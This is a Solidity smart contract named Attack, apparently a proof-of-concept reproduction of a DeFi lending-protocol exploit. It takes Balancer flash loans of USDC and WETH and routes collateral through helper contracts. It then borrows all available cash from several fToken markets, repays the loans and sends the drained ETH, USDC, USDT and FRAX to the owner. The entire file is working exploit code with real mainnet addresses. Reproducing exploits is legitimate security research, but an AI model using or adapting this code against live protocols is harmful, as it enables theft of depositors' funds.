// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "hardhat/console.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./attackB.sol";
import "./interface.sol";

contract Attack is Ownable {
  address constant balancerAddress = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
  address constant wethAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

  address controllerAddress;
  address fEthAddress;
  address[] otherFTokenAddress;
  uint256 wethFlashloanAmount = 50000000000000000000000;

  constructor() {}

  receive() external payable {
    // console.log('attack A, %s', msg.value);
  }

  function attack(
    address _unitrollerAddress,
    address _fEthAddress,
    address _flashLoanTokenAddress,
    uint256 _flashLoanAmount,
    address[] calldata _otherFTokenAddress
  ) external onlyOwner {
    controllerAddress = _unitrollerAddress;
    fEthAddress = _fEthAddress;
    otherFTokenAddress = _otherFTokenAddress;

    IERC20[] memory flashloanTokens = new IERC20[](2);
    flashloanTokens[0] = IERC20(_flashLoanTokenAddress);
    flashloanTokens[1] = IERC20(wethAddress);

    uint256[] memory flashloanAmounts = new uint256[](2);
    flashloanAmounts[0] = _flashLoanAmount;
    flashloanAmounts[1] = wethFlashloanAmount;
    
    IFlashLoan(balancerAddress).flashLoan(
      IFlashLoanRecipient(address(this)),
      flashloanTokens,  // USDC & WETH
      flashloanAmounts,
      ''
    );
  }

  function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory,
    bytes memory
  ) external {
    IFETH fEth = IFETH(fEthAddress);
    IWETH wEth = IWETH(wethAddress);
    IController controller = IController(controllerAddress);

    AttackB attackB = new AttackB();
    
    // USDC transfer to B
    tokens[0].transfer(address(attackB), amounts[0]);

    attackB.setup(otherFTokenAddress[0]);  // fUSDC
    attackB.mint();
    attackB.borrow(fEth.getCash());
    attackB.redeemAll();

    // unwrap ether(WETH from flashloan -> ETH)
    wEth.withdraw(wethFlashloanAmount);

    fEth.mint{value: wethFlashloanAmount}();
    address[] memory enterMarketList = new address[](1);
    enterMarketList[0] = fEthAddress;
    controller.enterMarkets(enterMarketList);

    for (uint8 i=0; i<otherFTokenAddress.length; i++) {
      console.log('================================================== %s', i+1);
      IFToken fToken = IFToken(otherFTokenAddress[i]);
      fToken.borrow(fToken.getCash());

      // get USDC 150000000000000 + 7144266341363
      uint balance = tokens[0].balanceOf(address(this));
      console.log('usdc balance, %s', balance);

      // get USDT 132959900829
      balance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
      console.log('usdt balance, %s', balance);

      // get FRAX 776937058467725803492533
      balance = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e).balanceOf(address(this));
      console.log('frax balance, %s', balance);
    }

    // create new contract
    AttackB attackB2 = new AttackB();

    // USDC transfer to B2
    tokens[0].transfer(address(attackB2), amounts[0]);

    attackB2.setup(otherFTokenAddress[0]);
    attackB2.mint();

    (, uint u2, ) = controller.getAccountLiquidity(address(attackB2));

    attackB2.borrow(u2);
    attackB2.redeemAll();
    fEth.redeemUnderlying(fEth.getCash());

    // pay back flashloan of WETH
    wEth.deposit{value: wethFlashloanAmount}();
    wEth.transfer(balancerAddress, wethFlashloanAmount);

    // pay back flashloan of USDC
    tokens[0].transfer(balancerAddress, amounts[0]);

    // transfer all profits to other contract
    payable(owner()).transfer(address(this).balance);
    tokens[0].transfer(owner(), tokens[0].balanceOf(address(this)));

    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    usdt.transfer(owner(), usdt.balanceOf(address(this)));

    IERC20 frax = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    frax.transfer(owner(), frax.balanceOf(address(this)));
  }
}
